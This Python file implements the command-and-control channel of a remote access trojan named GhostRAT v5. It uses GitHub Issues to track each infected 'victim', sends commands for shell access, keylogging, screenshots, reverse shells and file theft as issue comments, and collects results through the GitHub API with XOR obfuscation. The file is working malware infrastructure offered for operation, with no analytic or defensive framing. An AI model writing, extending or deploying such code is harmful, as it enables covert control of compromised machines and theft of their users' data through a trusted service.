"""
GhostRAT v5 — GitHub Issues C2 Channel
========================================

Uses GitHub Issues as a command-and-control channel for GhostRAT v5 implants.

Each victim = one GitHub Issue (labelled ``ghostrat-v5``).
Commands are sent as Issue comments.
Results are posted as Issue body updates.

Command format in Issue comments::

    GHOST <victim_id> <cmd_type_hex> [data]

Command types:
    0x01  FileRead
    0x04  Heartbeat
    0x05  Shell
    0x06  Keylog
    0x07  Screenshot
    0x08  ProcessList
    0x09  NetworkConnections
    0x0A  ReverseShell
    0x0B  FileDownload
    0x0C  FileUpload
    0x0D  SystemInfo

Issue body format::

    # Victim: <victim_id>
    Name: <victim_id>
    Channel: github_issues
    Status: active
    Last Heartbeat: 2026-11-22 19:00:00
    Commands Received: 5
    Results Received: 3

    ---
    last_processed_comment_id: 1234567890
    last_heartbeat: 2026-11-22T19:00:00Z
"""

from __future__ import annotations

import json
import logging
import re
import time
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional, Tuple

import requests

logger = logging.getLogger("GhostRATv5.GitHubIssuesC2")


# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

GHOST_PREFIX = "GHOST "
PROCESSED_PREFIX = "[PROCESSED] "
VICTIM_LABEL = "ghostrat-v5"
BODY_SEPARATOR = "---"
BODY_MARKER = "last_processed_comment_id"

# Regex for parsing a GHOST command comment
_COMMENT_RE = re.compile(
    r"^GHOST\s+"
    r"(\S+)\s+"          # victim_id
    r"(0x[0-9A-Fa-f]+)"  # cmd_type_hex
    r"(?:\s+(.+))?$",     # optional data
    re.IGNORECASE,
)

# Regex for parsing metadata lines in Issue body
_META_RE = re.compile(
    r"^(\w[\w\s]*?):\s*(.+)$", re.MULTILINE
)


# ---------------------------------------------------------------------------
# GitHubIssuesC2
# ---------------------------------------------------------------------------

class GitHubIssuesC2:
    """
    GitHub Issues C2 channel for GhostRAT v5.

    Each victim is represented by a GitHub Issue. Commands are delivered
    as Issue comments; results are written to the Issue body.

    Args:
        repo_owner: GitHub repository owner / organization.
        repo_name:  GitHub repository name.
        github_token: Personal access token with ``repo`` scope.
        crypto_key: XOR encryption key (default ``GHOSTRATV5``).

    Attributes:
        repo_owner: Repository owner.
        repo_name:  Repository name.
        base_url:   GitHub API base URL.
        headers:    Auth headers for every request.
    """

    def __init__(
        self,
        repo_owner: str,
        repo_name: str,
        github_token: str,
        crypto_key: str = "GHOSTRATV5",
    ) -> None:
        if not repo_owner or not repo_name or not github_token:
            raise ValueError(
                "repo_owner, repo_name, and github_token are required."
            )

        self.repo_owner: str = repo_owner
        self.repo_name: str = repo_name
        self.crypto_key: str = crypto_key
        self.base_url: str = "https://api.github.com"
        self.headers: Dict[str, str] = {
            "Authorization": f"token {github_token}",
            "Accept": "application/vnd.github.v3+json",
            "X-GitHub-Api-Version": "2022-11-28",
        }

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    def _url(self, path: str) -> str:
        """Build a full API URL from a relative path."""
        return f"{self.base_url}/repos/{self.repo_owner}/{self.repo_name}{path}"

    def _request(
        self,
        method: str,
        path: str,
        json_data: Optional[Dict] = None,
        params: Optional[Dict] = None,
        max_retries: int = 3,
        backoff: float = 2.0,
    ) -> Dict[str, Any]:
        """
        Perform an HTTP request with rate-limit retry.

        On HTTP 429 the request is retried with exponential backoff.
        On other non-2xx responses a ``RuntimeError`` is raised.

        Returns:
            Parsed JSON response body (dict).
        """
        url = self._url(path)
        last_exc: Optional[Exception] = None

        for attempt in range(1, max_retries + 1):
            try:
                resp = requests.request(
                    method,
                    url,
                    headers=self.headers,
                    json=json_data,
                    params=params,
                    timeout=15,
                )
            except requests.RequestException as exc:
                last_exc = exc
                logger.warning("Request to %s failed (attempt %d): %s", url, attempt, exc)
                time.sleep(backoff * attempt)
                continue

            if resp.status_code == 429:
                retry_after = int(resp.headers.get("Retry-After", str(backoff * attempt)))
                logger.info("Rate limited — retrying after %ds", retry_after)
                time.sleep(retry_after)
                continue

            if resp.status_code == 404:
                raise RuntimeError(f"Not found: {url}")

            if not resp.ok:
                body = resp.text[:500]
                raise RuntimeError(
                    f"HTTP {resp.status_code} on {url}: {body}"
                )

            # Success — try to parse JSON
            try:
                return resp.json()
            except json.JSONDecodeError:
                return {}

        raise RuntimeError(
            f"Request to {url} failed after {max_retries} retries: {last_exc}"
        )

    @staticmethod
    def xor_encrypt(data: bytes, key: str) -> bytes:
        """XOR-encrypt data with *key*."""
        key_bytes = key.encode("utf-8")
        return bytes(b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(data))

    @staticmethod
    def xor_decrypt(data: bytes, key: str) -> bytes:
        """XOR-decrypt data with *key* (symmetric to encrypt)."""
        return GitHubIssuesC2.xor_encrypt(data, key)

    # ------------------------------------------------------------------
    # Victim lifecycle
    # ------------------------------------------------------------------

    def create_victim_issue(
        self,
        victim_id: str,
        victim_name: str = "",
        tags: Optional[List[str]] = None,
    ) -> Dict[str, Any]:
        """
        Create a new GitHub Issue for a victim.

        The Issue body is initialised with metadata and the issue is
        labelled with ``ghostrat-v5``.

        Args:
            victim_id:  Unique identifier for the victim.
            victim_name: Human-readable name (optional).
            tags:       Additional labels to apply.

        Returns:
            GitHub Issue JSON object (full object returned by the API).
        """
        if not victim_id:
            raise ValueError("victim_id is required.")

        now = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
        body = (
            f"# Victim: {victim_id}\n"
            f"Name: {victim_id}\n"
            f"Channel: github_issues\n"
            f"Status: active\n"
            f"Last Heartbeat: {now}\n"
            f"Commands Received: 0\n"
            f"Results Received: 0\n"
            f"\n"
            f"{BODY_SEPARATOR}\n"
            f"{BODY_MARKER}: 0\n"
            f"last_heartbeat:\n"
        )

        labels = list(tags) if tags else []
        labels.append(VICTIM_LABEL)
        # Deduplicate while preserving order
        labels = list(dict.fromkeys(labels))

        payload: Dict[str, Any] = {
            "title": f"GhostRAT {victim_id}",
            "body": body,
            "labels": labels,
        }

        logger.info("Creating victim issue for %s", victim_id)
        return self._request("POST", "/issues", json_data=payload)

    def close_victim_issue(self, victim_id: str) -> Dict[str, Any]:
        """
        Close the GitHub Issue for a victim.

        Args:
            victim_id: The victim whose Issue should be closed.

        Returns:
            Updated Issue JSON object.
        """
        issue = self._get_issue_by_title(victim_id)
        issue_number = issue["number"]
        return self._request(
            "PATCH",
            f"/issues/{issue_number}",
            json_data={"state": "closed"},
        )

    def _get_issue_by_title(self, victim_id: str) -> Dict[str, Any]:
        """
        Find the GitHub Issue corresponding to a victim by its title.

        Returns:
            Issue JSON object.

        Raises:
            RuntimeError: If no matching issue is found.
        """
        issues = self.list_victims()
        for issue in issues:
            title = issue.get("title", "")
            if victim_id in title:
                return issue
        raise RuntimeError(f"No issue found for victim '{victim_id}'")

    # ------------------------------------------------------------------
    # Command polling
    # ------------------------------------------------------------------

    def get_commands(self, victim_id: str) -> List[Dict[str, Any]]:
        """
        Poll a victim's Issue for new commands (comments).

        Only comments that do *not* start with ``[PROCESSED]`` are
        returned. The victim's metadata is updated with the latest
        processed comment ID.

        Args:
            victim_id: The victim to poll.

        Returns:
            List of new command dicts, each containing:
            ``comment_id``, ``comment_body``, ``victim_id``,
            ``cmd_type``, ``data``, ``created_at``.
        """
        issue = self._get_issue_by_title(victim_id)
        issue_number = issue["number"]

        comments = self._poll_comments(issue_number)
        if not comments:
            return []

        last_processed = self._get_last_processed(victim_id)
        new_commands: List[Dict[str, Any]] = []

        for comment in comments:
            c_id = comment["id"]
            c_body = comment.get("body", "")

            if c_id <= last_processed:
                continue

            match = _COMMENT_RE.match(c_body)
            if not match:
                continue

            cmd_victim, cmd_type_hex, cmd_data = match.groups()
            if cmd_victim != victim_id:
                continue

            try:
                cmd_type = int(cmd_type_hex, 16)
            except ValueError:
                logger.warning("Invalid cmd_type_hex: %s", cmd_type_hex)
                continue

            new_commands.append({
                "comment_id": c_id,
                "comment_body": c_body,
                "victim_id": cmd_victim,
                "cmd_type": cmd_type,
                "data": cmd_data or "",
                "created_at": comment.get("created_at", ""),
            })

        if new_commands:
            latest_id = max(c["comment_id"] for c in new_commands)
            self._mark_comment_processed(victim_id, latest_id)

        return new_commands

    def _poll_comments(self, issue_number: int) -> List[Dict[str, Any]]:
        """
        Fetch all comments for an Issue, sorted by ``created_at`` ascending.

        Args:
            issue_number: GitHub Issue number.

        Returns:
            List of comment dicts sorted chronologically.
        """
        comments = self._request(
            "GET",
            f"/issues/{issue_number}/comments",
        )
        # API may return a list or a dict with a 'comments' key
        if isinstance(comments, list):
            raw = comments
        elif isinstance(comments, dict) and "comments" in comments:
            raw = comments["comments"]
        else:
            return []

        return sorted(raw, key=lambda c: c.get("created_at", ""))

    def _mark_comment_processed(self, victim_id: str, comment_id: int) -> None:
        """
        Update the victim's Issue body with the latest processed comment ID
        and prefix the newest relevant comment with ``[PROCESSED]``.

        Args:
            victim_id:  Victim identifier.
            comment_id: GitHub comment ID that is now processed.
        """
        self._update_metadata(victim_id, {
            BODY_MARKER: str(comment_id),
            "last_heartbeat": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
        })

    def _get_last_processed(self, victim_id: str) -> int:
        """
        Read the last processed comment ID from the victim's Issue body.

        Args:
            victim_id: Victim identifier.

        Returns:
            Last processed comment ID (0 if not set).
        """
        issue = self._get_issue_by_title(victim_id)
        body = issue.get("body", "")
        return self._parse_metadata(body).get(BODY_MARKER, "0")

    # ------------------------------------------------------------------
    # Result delivery
    # ------------------------------------------------------------------

    def send_result(self, victim_id: str, result_data: str) -> Dict[str, Any]:
        """
        Post a result to the victim's Issue body.

        The Issue body is updated with the result text, keeping the
        metadata section intact.

        Args:
            victim_id:  Victim identifier.
            result_data: Result payload (plain text).

        Returns:
            Updated Issue JSON object.
        """
        issue = self._get_issue_by_title(victim_id)
        issue_number = issue["number"]
        current_body = issue.get("body", "")

        updated_body = self._append_to_body(current_body, result_data)

        return self._request(
            "PATCH",
            f"/issues/{issue_number}",
            json_data={"body": updated_body},
        )

    def get_victim_status(self, victim_id: str) -> Dict[str, Any]:
        """
        Read the victim's current status from the Issue body.

        Args:
            victim_id: Victim identifier.

        Returns:
            Dict containing status fields extracted from the Issue body.
        """
        issue = self._get_issue_by_title(victim_id)
        body = issue.get("body", "")
        metadata = self._parse_metadata(body)

        # Extract top-level fields (before the --- separator)
        top_section = body.split(BODY_SEPARATOR)[0] if BODY_SEPARATOR in body else body
        top_fields: Dict[str, str] = {}
        for line in top_section.strip().splitlines():
            m = _META_RE.match(line.strip())
            if m:
                top_fields[m.group(1).strip()] = m.group(2).strip()

        return {
            "victim_id": victim_id,
            "issue_number": issue["number"],
            "issue_state": issue.get("state", "unknown"),
            "status": top_fields.get("Status", "unknown"),
            "last_heartbeat": top_fields.get("Last Heartbeat", "never"),
            "commands_received": top_fields.get("Commands Received", "0"),
            "results_received": top_fields.get("Results Received", "0"),
            "metadata": metadata,
        }

    def list_victims(self) -> List[Dict[str, Any]]:
        """
        List all GitHub Issues tagged with the victim label.

        Returns:
            List of Issue dicts (GitHub API format).
        """
        params = {
            "state": "all",
            "labels": [VICTIM_LABEL],
            "sort": "created",
            "direction": "desc",
        }
        issues = self._request("GET", "/issues", params=params)
        if isinstance(issues, list):
            return issues
        return []

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    @staticmethod
    def _parse_metadata(body: str) -> Dict[str, str]:
        """
        Extract key-value metadata from the Issue body (below the separator).

        Args:
            body: Full Issue body text.

        Returns:
            Dict of metadata key-value pairs.
        """
        if BODY_SEPARATOR not in body:
            return {}

        meta_section = body.split(BODY_SEPARATOR, 1)[1]
        metadata: Dict[str, str] = {}
        for line in meta_section.strip().splitlines():
            m = _META_RE.match(line.strip())
            if m:
                metadata[m.group(1).strip()] = m.group(2).strip()
        return metadata

    def _update_metadata(
        self,
        victim_id: str,
        updates: Dict[str, str],
    ) -> None:
        """
        Update metadata fields in the victim's Issue body.

        Args:
            victim_id: Victim identifier.
            updates:   Dict of metadata keys to new values.
        """
        issue = self._get_issue_by_title(victim_id)
        issue_number = issue["number"]
        current_body = issue.get("body", "")

        if BODY_SEPARATOR not in current_body:
            current_body += f"\n{BODY_SEPARATOR}\n"

        top, meta = current_body.split(BODY_SEPARATOR, 1)

        for key, value in updates.items():
            pattern = re.compile(
                rf"^({re.escape(key)}[\w\s]*?):\s*.+$",
                re.MULTILINE,
            )
            replacement = f"{key}: {value}"
            meta = pattern.sub(replacement, meta)

        updated_body = f"{top}{BODY_SEPARATOR}\n{meta}"

        self._request(
            "PATCH",
            f"/issues/{issue_number}",
            json_data={"body": updated_body},
        )

    @staticmethod
    def _append_to_body(body: str, text: str) -> str:
        """
        Append result text to the Issue body above the metadata section.

        Args:
            body:  Current Issue body.
            text:  Result text to append.

        Returns:
            Updated Issue body.
        """
        if BODY_SEPARATOR in body:
            top, meta = body.split(BODY_SEPARATOR, 1)
            # Append before the separator
            result_section = top.rstrip() + "\n\n---\n" + text.strip() + "\n"
            return f"{result_section}\n{BODY_SEPARATOR}\n{meta}"
        else:
            return body + f"\n\n---\n{text.strip()}\n"

    # ------------------------------------------------------------------
    # Convenience: send a single command
    # ------------------------------------------------------------------

    def send_command(self, victim_id: str, cmd_type: int, data: str = "") -> Dict[str, Any]:
        """
        Send a single command to a victim by posting a comment.

        Args:
            victim_id:  Victim identifier.
            cmd_type:   Command type (hex integer, e.g. ``0x05``).
            data:       Optional command payload.

        Returns:
            Created Comment JSON object.
        """
        issue = self._get_issue_by_title(victim_id)
        issue_number = issue["number"]

        cmd_hex = f"0x{cmd_type:02X}"
        comment_body = f"{GHOST_PREFIX}{victim_id} {cmd_hex}"
        if data:
            comment_body += f" {data}"

        logger.info(
            "Sending cmd 0x%02X to %s (issue #%d)",
            cmd_type, victim_id, issue_number,
        )

        return self._request(
            "POST",
            f"/issues/{issue_number}/comments",
            json_data={"body": comment_body},
        )
